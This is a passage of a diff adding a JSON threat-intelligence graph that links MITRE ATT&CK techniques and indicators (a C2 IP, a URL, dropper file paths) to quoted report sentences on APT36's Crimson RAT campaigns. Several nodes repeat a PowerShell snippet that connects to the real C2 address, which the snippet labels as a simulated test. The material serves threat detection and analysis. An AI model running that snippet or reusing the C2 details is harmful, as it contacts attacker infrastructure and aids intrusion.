+            "Observed lure themes include professional networking invitations claiming to be from potential business partners, investors, or government procurement officials; industry conference and event invitations featuring realistic agendas, speaker lineups, and registration information; investment pitch decks and funding opportunity documentation appearing to come from venture capital firms or government funding programs; technology partnership and collaboration proposals suggesting mutually beneficial business arrangements; government tender documents and procurement announcements for technology services; and startup accelerator program applications and selection notices.",
+            "These carefully crafted lures are distributed via targeted phishing emails that often impersonate legitimate organizations, industry associations, government agencies, or well-known venture capital firms.",
+            "The use of ISO container files provides multiple tactical advantages for the attackers."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            3,
+            3
+          ],
+          [
+            13,
+            17
+          ]
+        ],
+        "edges": [
+          "EDGE_59354ac25277",
+          "EDGE_b4e66f0cd039",
+          "EDGE_e58024991604"
+        ],
+        "source": {
+          "TTP:T1566_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": {
+            "best_span_ranges": [
+              [
+                3,
+                3
+              ],
+              [
+                13,
+                17
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The technical delivery mechanism leverages malicious ISO container files distributed via phishing emails or malicious links."
+              ],
+              [
+                "The Transparent Tribe campaign relies fundamentally on sophisticated social engineering tactics that demonstrate extensive pre-operational reconnaissance of target organizations and individuals.",
+                "The threat actors craft phishing lures specifically tailored to the interests, responsibilities, and business priorities of startup founders, executives, and technical personnel.",
+                "Observed lure themes include professional networking invitations claiming to be from potential business partners, investors, or government procurement officials; industry conference and event invitations featuring realistic agendas, speaker lineups, and registration information; investment pitch decks and funding opportunity documentation appearing to come from venture capital firms or government funding programs; technology partnership and collaboration proposals suggesting mutually beneficial business arrangements; government tender documents and procurement announcements for technology services; and startup accelerator program applications and selection notices.",
+                "These carefully crafted lures are distributed via targeted phishing emails that often impersonate legitimate organizations, industry associations, government agencies, or well-known venture capital firms.",
+                "The use of ISO container files provides multiple tactical advantages for the attackers."
+              ]
+            ]
+          },
+          "TTP:T1566_socprime.com_active-threats_transparent-tribe-targets-indias-startup-ecosystem": {
+            "best_span_ranges": [
+              [
+                0,
+                0
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Transparent Tribe (aka APT36) has expanded its spear-phishing activity to target Indian startup companies, with a notable focus on firms offering OSINT and cybersecurity services."
+              ]
+            ]
+          },
+          "TTP:T1566_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": {
+            "best_span_ranges": [
+              [
+                1,
+                1
+              ],
+              [
+                3,
+                5
+              ],
+              [
+                9,
+                10
+              ],
+              [
+                25,
+                25
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "A recent blog post described how the APT36 group used the coronavirus outbreak to lure users into opening a fake health advisory which, upon execution, infected their devices with the Crimson RAT."
+              ],
+              [
+                "The attack chain starts with a spear-phishing email that is sent to targeted entities and contains a malicious attachment.",
+                "Campaign 1 starts with a phishing email containing a link to a malicious PE (executable) file.",
+                "This PE file has two ZIP files and a DOC file embedded in the resources section."
+              ],
+              [
+                "Campaign 2 starts with a spear-phishing email containing a DOC file as the attachment.",
+                "The DOC file has an embedded malicious macro."
+              ],
+              [
+                "In this case, an Indian financial institution was targeted with a spear-phishing email containing a malicious DOC file or malicious executable, and the payload dropped in the attack was Crimson RAT."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1027",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1027",
+        "ttp_id": "T1027",
+        "best_span_sentences_list": [
+          [
+            "Their findings highlight multiple layers of obfuscation, hard-coded C2 details, use of a custom TCP communication protocol, and persistence implemented through a concealed executable placed in the user’s AppData directory.",
+            "The team also identified infrastructure overlap with prior APT36 operations, including reuse patterns across domains and IP addresses.",
+            "$c2Ip = \"93.127.133.9\" $c2Port = 12345 # primary port; change to 54321 for fallback testing try { Write-Host \"[*] Attempting C2 connection to $c2Ip:$c2Port ...\" $socket = New-Object System.Net.Sockets.TcpClient $socket.Connect($c2Ip,$c2Port) # Send a minimal handshake payload (simulated) $stream = $socket.GetStream() $payload = [System.Text.Encoding]::ASCII.GetBytes(\"HELLO`n\") $stream.Write($payload,0,$payload.Length) Write-Host \"[+] Handshake sent.\" # Keep the connection alive for a short period to ensure logging Start-Sleep -Seconds 10 $stream.Close() $socket.Close() Write-Host \"[*] Connection closed.\" } catch { Write-Error \"Failed to connect to C2: $_\" }."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            5,
+            7
+          ]
+        ],
+        "edges": [
+          "EDGE_4ecdbea703a1"
+        ],
+        "source": {
+          "TTP:T1027_socprime.com_active-threats_transparent-tribe-targets-indias-startup-ecosystem": {
+            "best_span_ranges": [
+              [
+                5,
+                7
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Their findings highlight multiple layers of obfuscation, hard-coded C2 details, use of a custom TCP communication protocol, and persistence implemented through a concealed executable placed in the user’s AppData directory.",
+                "The team also identified infrastructure overlap with prior APT36 operations, including reuse patterns across domains and IP addresses.",
+                "$c2Ip = \"93.127.133.9\" $c2Port = 12345 # primary port; change to 54321 for fallback testing try { Write-Host \"[*] Attempting C2 connection to $c2Ip:$c2Port ...\" $socket = New-Object System.Net.Sockets.TcpClient $socket.Connect($c2Ip,$c2Port) # Send a minimal handshake payload (simulated) $stream = $socket.GetStream() $payload = [System.Text.Encoding]::ASCII.GetBytes(\"HELLO`n\") $stream.Write($payload,0,$payload.Length) Write-Host \"[+] Handshake sent.\" # Keep the connection alive for a short period to ensure logging Start-Sleep -Seconds 10 $stream.Close() $socket.Close() Write-Host \"[*] Connection closed.\" } catch { Write-Error \"Failed to connect to C2: $_\" }."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1071",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1071",
+        "ttp_id": "T1071",
+        "best_span_sentences_list": [
+          [
+            "Their findings highlight multiple layers of obfuscation, hard-coded C2 details, use of a custom TCP communication protocol, and persistence implemented through a concealed executable placed in the user’s AppData directory.",
+            "The team also identified infrastructure overlap with prior APT36 operations, including reuse patterns across domains and IP addresses.",
+            "$c2Ip = \"93.127.133.9\" $c2Port = 12345 # primary port; change to 54321 for fallback testing try { Write-Host \"[*] Attempting C2 connection to $c2Ip:$c2Port ...\" $socket = New-Object System.Net.Sockets.TcpClient $socket.Connect($c2Ip,$c2Port) # Send a minimal handshake payload (simulated) $stream = $socket.GetStream() $payload = [System.Text.Encoding]::ASCII.GetBytes(\"HELLO`n\") $stream.Write($payload,0,$payload.Length) Write-Host \"[+] Handshake sent.\" # Keep the connection alive for a short period to ensure logging Start-Sleep -Seconds 10 $stream.Close() $socket.Close() Write-Host \"[*] Connection closed.\" } catch { Write-Error \"Failed to connect to C2: $_\" }."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            5,
+            7
+          ]
+        ],
+        "edges": [
+          "EDGE_1c0f46427ddd",
+          "EDGE_e624493e1dc0"
+        ],
+        "source": {
+          "TTP:T1071_socprime.com_active-threats_transparent-tribe-targets-indias-startup-ecosystem": {
+            "best_span_ranges": [
+              [
+                5,
+                7
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Their findings highlight multiple layers of obfuscation, hard-coded C2 details, use of a custom TCP communication protocol, and persistence implemented through a concealed executable placed in the user’s AppData directory.",
+                "The team also identified infrastructure overlap with prior APT36 operations, including reuse patterns across domains and IP addresses.",
+                "$c2Ip = \"93.127.133.9\" $c2Port = 12345 # primary port; change to 54321 for fallback testing try { Write-Host \"[*] Attempting C2 connection to $c2Ip:$c2Port ...\" $socket = New-Object System.Net.Sockets.TcpClient $socket.Connect($c2Ip,$c2Port) # Send a minimal handshake payload (simulated) $stream = $socket.GetStream() $payload = [System.Text.Encoding]::ASCII.GetBytes(\"HELLO`n\") $stream.Write($payload,0,$payload.Length) Write-Host \"[+] Handshake sent.\" # Keep the connection alive for a short period to ensure logging Start-Sleep -Seconds 10 $stream.Close() $socket.Close() Write-Host \"[*] Connection closed.\" } catch { Write-Error \"Failed to connect to C2: $_\" }."
+              ]
+            ]
+          },
+          "TTP:T1071_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": {
+            "best_span_ranges": [
+              [
+                18,
+                18
+              ],
+              [
+                22,
+                22
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "It receives commands from the C&C server, performs the desired activities, and sends the results back to the C&C server."
+              ],
+              [
+                "The RAT uses a custom protocol for its C&C communications."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1041",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1041",
+        "ttp_id": "T1041",
+        "best_span_sentences_list": [
+          [
+            "Crimson RAT has the functionality to exfiltrate files and system data and transfer it over non-web channels to its command-and-control (C&C) server."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            15,
+            15
+          ]
+        ],
+        "edges": [
+          "EDGE_c368d05ec39a"
+        ],
+        "source": {
+          "TTP:T1041_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": {
+            "best_span_ranges": [
+              [
+                15,
+                15
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Crimson RAT has the functionality to exfiltrate files and system data and transfer it over non-web channels to its command-and-control (C&C) server."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1056",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1056",
+        "ttp_id": "T1056",
+        "best_span_sentences_list": [
+          [
+            "It downloads additional module payloads from its C&C server to perform keylogging and to steal browser credentials."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            17,
+            17
+          ]
+        ],
+        "edges": [
+          "EDGE_d149b537e243"
+        ],
+        "source": {
+          "TTP:T1056_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": {
+            "best_span_ranges": [
+              [
+                17,
+                17
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "It downloads additional module payloads from its C&C server to perform keylogging and to steal browser credentials."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1082",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1082",
+        "ttp_id": "T1082",
+        "best_span_sentences_list": [
+          [
+            "On execution, the malicious attachment first checks for the OS version of the system and, based on the result, it drops a 32-bit or 64-bit version of the payload stored in resources."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            6,
+            6
+          ]
+        ],
+        "edges": [
+          "EDGE_197c548afe22"
+        ],
+        "source": {
+          "TTP:T1082_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": {
+            "best_span_ranges": [
+              [
+                6,
+                6
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "On execution, the malicious attachment first checks for the OS version of the system and, based on the result, it drops a 32-bit or 64-bit version of the payload stored in resources."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1105",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1105",
+        "ttp_id": "T1105",
+        "best_span_sentences_list": [
+          [
+            "It downloads additional module payloads from its C&C server to perform keylogging and to steal browser credentials."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            17,
+            17
+          ]
+        ],
+        "edges": [
+          "EDGE_295c126401b4"
+        ],
+        "source": {
+          "TTP:T1105_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": {
+            "best_span_ranges": [
+              [
+                17,
+                17
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "It downloads additional module payloads from its C&C server to perform keylogging and to steal browser credentials."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1113",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1113",
+        "ttp_id": "T1113",
+        "best_span_sentences_list": [
+          [
+            "The RAT is built with the ability to capture the screen and terminate any running processes."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            16,
+            16
+          ]
+        ],
+        "edges": [
+          "EDGE_1e51f6ff14ab"
+        ],
+        "source": {
+          "TTP:T1113_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": {
+            "best_span_ranges": [
+              [
+                16,
+                16
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The RAT is built with the ability to capture the screen and terminate any running processes."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1555",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1555",
+        "ttp_id": "T1555",
+        "best_span_sentences_list": [
+          [
+            "It downloads additional module payloads from its C&C server to perform keylogging and to steal browser credentials."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            17,
+            17
+          ]
+        ],
+        "edges": [
+          "EDGE_f0af3c9e7a9f"
+        ],
+        "source": {
+          "TTP:T1555_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": {
+            "best_span_ranges": [
+              [
+                17,
+                17
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "It downloads additional module payloads from its C&C server to perform keylogging and to steal browser credentials."
+              ]
+            ]
+          }
+        }
+      }
+    ],
+    "ioc": [
+      {
+        "node_id": "IOC_f38d053860c5",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://sis.voldebug.in/",
+        "edges": [],
+        "source": {
+          "https://sis.voldebug.in/_hivepro.com_threat-advisory_transparent-tribe-targets-indias-startup-ecosystem-with-crimson-rat": [
+            [
+              38,
+              "The threat advisory references a recent breach disclosure at https://sis.voldebug.in/, suggesting a compromised organization or threat actor testing infrastructure associated with this campaign."
+            ]
+          ]
+        },
+        "raw_value": "https://sis.voldebug.in/",
+        "canonical_value": "https://sis.voldebug.in/",
+        "normalized_value": "https://sis.voldebug.in/"
+      },
+      {
+        "node_id": "IOC_fb445819b461",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "93.127.133.9",
+        "edges": [
+          "EDGE_1c0f46427ddd"
+        ],
+        "source": {
+          "93.127.133.9_socprime.com_active-threats_transparent-tribe-targets-indias-startup-ecosystem": [
+            [
+              7,
+              "$c2Ip = \"93.127.133.9\" $c2Port = 12345 # primary port; change to 54321 for fallback testing try { Write-Host \"[*] Attempting C2 connection to $c2Ip:$c2Port ...\" $socket = New-Object System.Net.Sockets.TcpClient $socket.Connect($c2Ip,$c2Port) # Send a minimal handshake payload (simulated) $stream = $socket.GetStream() $payload = [System.Text.Encoding]::ASCII.GetBytes(\"HELLO`n\") $stream.Write($payload,0,$payload.Length) Write-Host \"[+] Handshake sent.\" # Keep the connection alive for a short period to ensure logging Start-Sleep -Seconds 10 $stream.Close() $socket.Close() Write-Host \"[*] Connection closed.\" } catch { Write-Error \"Failed to connect to C2: $_\" }."
+            ]
+          ]
+        },
+        "raw_value": "93.127.133.9",
+        "canonical_value": "93.127.133.9"
+      },
+      {
+        "node_id": "IOC_0ee23704358d",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\ProgramData\\Hblondas\\rihndimrva.exe",
+        "edges": [
+          "EDGE_8a08ff682f7a"
+        ],
+        "source": {
+          "C:\\ProgramData\\Hblondas\\rihndimrva.exe_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": [
+            [
+              13,
+              "Based on the OS version of the victim's system, it drops a Crimson RAT payload at C:\\ProgramData\\Hblondas\\rihndimrva.exe and executes it."
+            ]
+          ]
+        },
+        "raw_value": "C:\\ProgramData\\Hblondas\\rihndimrva.exe",
+        "canonical_value": "C:\\ProgramData\\Hblondas\\rihndimrva.exe",
+        "normalized_value": "C:\\ProgramData\\Hblondas\\rihndimrva.exe"
+      },
+      {
+        "node_id": "IOC_2874349b6018",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\ProgramData\\Bhoithas\\dhdxcia.zip",
+        "edges": [
+          "EDGE_b870ab3b1a08"
+        ],
+        "source": {
+          "C:\\ProgramData\\Bhoithas\\dhdxcia.zip_www.zscaler.com_blogs_security-research_targeted-attack-indian-financial-institution-delivers-crimson-rat": [
+            [
+              7,
+              "The ZIP payload is dropped at C:\\ProgramData\\Bhoithas\\dhdxcia.zip, after which the ZIP file is extracted in the same directory with the name brwmarivas.exe, and then it's executed, which results in the Crimson RAT."
+            ]
+          ]
+        },
+        "raw_value": "C:\\ProgramData\\Bhoithas\\dhdxcia.zip",
+        "canonical_value": "C:\\ProgramData\\Bhoithas\\dhdxcia.zip",
+        "normalized_value": "C:\\ProgramData\\Bhoithas\\dhdxcia.zip"
+      }
+    ]
+  },
+  "edges": [
+    {
+      "edge_id": "EDGE_1247aa8bb73b",
+      "node_u": "HL_56f80800a4d1",
+      "node_v": "TTP_T1095",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1bcf824222e5",
+      "node_u": "HL_153928bf9609",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_2f5eeee5e742",
+      "node_u": "HL_9728b1ff28eb",
+      "node_v": "TTP_T1023",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_316692d823b4",
+      "node_u": "HL_153928bf9609",
+      "node_v": "TTP_T1553",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_36dd8a6f273e",
+      "node_u": "HL_9728b1ff28eb",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_4e528cab6bf3",
+      "node_u": "HL_9728b1ff28eb",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_59354ac25277",
+      "node_u": "HL_9728b1ff28eb",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_63053cc02dba",
+      "node_u": "HL_9e9d59dfb164",
+      "node_v": "TTP_T1553",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_85f03ccca4ab",
+      "node_u": "HL_153928bf9609",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_a2dd9b2960eb",
+      "node_u": "HL_44463ac59fa0",
+      "node_v": "TTP_T1553",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_a553db3194aa",
+      "node_u": "HL_9728b1ff28eb",
+      "node_v": "TTP_T1219",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_c3206b82c8ee",
+      "node_u": "HL_9728b1ff28eb",
+      "node_v": "TTP_T1036",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_dfc42d7fd169",
+      "node_u": "HL_56f80800a4d1",
+      "node_v": "TTP_T1219",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1c0f46427ddd",
+      "node_u": "IOC_fb445819b461",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_4ecdbea703a1",
+      "node_u": "HL_56f80800a4d1",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_58f4b596918e",
+      "node_u": "HL_56f80800a4d1",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_e624493e1dc0",
+      "node_u": "HL_56f80800a4d1",
+      "node_v": "TTP_T1071",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_197c548afe22",
+      "node_u": "HL_56f80800a4d1",
+      "node_v": "TTP_T1082",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1e51f6ff14ab",
+      "node_u": "HL_56f80800a4d1",
+      "node_v": "TTP_T1113",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_295c126401b4",
+      "node_u": "HL_56f80800a4d1",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_8a08ff682f7a",
+      "node_u": "IOC_0ee23704358d",
+      "node_v": "TTP_T1204",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_a1e45a2f761e",
+      "node_u": "HL_91807a6015b9",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_b4e66f0cd039",
+      "node_u": "HL_91807a6015b9",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_b870ab3b1a08",
+      "node_u": "IOC_2874349b6018",
+      "node_v": "TTP_T1204",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_c368d05ec39a",
+      "node_u": "HL_56f80800a4d1",
+      "node_v": "TTP_T1041",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_d149b537e243",
+      "node_u": "HL_56f80800a4d1",
+      "node_v": "TTP_T1056",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_e58024991604",
+      "node_u": "HL_b9d4a3ae4382",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_e693abc2f3e1",
+      "node_u": "HL_b9d4a3ae4382",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_f0af3c9e7a9f",
+      "node_u": "HL_56f80800a4d1",
+      "node_v": "TTP_T1555",
+      "edge_type": "high_level-ttp"
+    }
+  ]
+}
